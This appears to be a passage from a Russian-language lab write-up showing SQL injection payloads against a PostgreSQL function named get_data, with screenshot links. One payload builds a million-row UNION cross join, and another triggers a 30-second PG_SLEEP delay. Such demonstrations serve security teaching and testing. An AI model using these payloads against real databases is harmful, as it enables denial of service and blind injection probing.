    SELECT * FROM get_data('1'' UNION
    (SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER)
    FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1
    CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');
<img width="565" alt="2-2-5-1" src="https://user-images.githubusercontent.com/55449630/206283862-6858632d-d0a3-438a-95ca-299f549c60ca.png">

    SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');
<img width="565" alt="2-2-5-2" src="https://user-images.githubusercontent.com/55449630/206283860-5e1b354d-e6b1-43d9-a14a-f9b54cb1f708.png">

#### Через 30 секунд:
<img width="565" alt="2-2-5-3" src="https://user-images.githubusercontent.com/55449630/206283851-80d54a1a-a226-46db-8b82-aca61faee4b8.png">
